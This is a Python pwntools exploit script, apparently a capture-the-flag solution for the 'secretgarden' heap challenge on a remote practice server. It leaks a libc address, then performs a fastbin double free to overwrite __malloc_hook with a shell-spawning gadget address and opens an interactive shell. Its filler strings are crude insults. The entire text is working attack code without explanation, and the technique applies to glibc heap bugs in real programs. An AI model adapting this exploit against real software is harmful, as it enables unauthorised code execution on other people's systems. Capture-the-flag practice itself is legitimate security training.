from pwn import *
r = remote('node3.buuoj.cn',28995)
#r = process('./secretgarden')
libc = ELF('/libc-2.23.so')
elf = ELF('./secretgarden')

def add(size,name,color):
	r.sendlineafter('Your choice :','1')
	r.sendlineafter('Length of the name :',str(size))
	r.sendafter('The name of flower :',name)
	r.sendlineafter('The color of the flower :',color)

def visit():
	r.sendlineafter('Your choice :','2')

def free(index):
	r.sendlineafter('Your choice :','3')
	r.sendlineafter('garden:',str(index))

def clean():
	r.sendlineafter('Your choice :','4')

#context.log_level = 'debug'

magic = 0x400c5e
add(0x90,'fuck','nmsl')
add(0x60,'fuck','nmsl')
free(0)
clean()
add(0x90,'a'*8,'nmsl')
visit()
r.recvuntil('a'*8)
libc_base = u64(r.recv(6).ljust(8,'\x00'))-0x3c4b78
log.success(hex(libc_base))
malloc_hook = libc_base +libc.sym['__malloc_hook']
log.success(hex(malloc_hook))
add(0x68,'wdnmd','nmsl')
add(0x68,'wdnmd','nmsl')
add(0x68,'wdnmd','nmsl')
free(2)
free(3)
free(2)
add(0x68,p64(malloc_hook-0x23),'nmsl')
add(0x68,'wdnmd','nmsl')
add(0x68,'wdnmd','nmsl')
add(0x68,'a'*0x13+p64(magic),'nmsl')


r.interactive()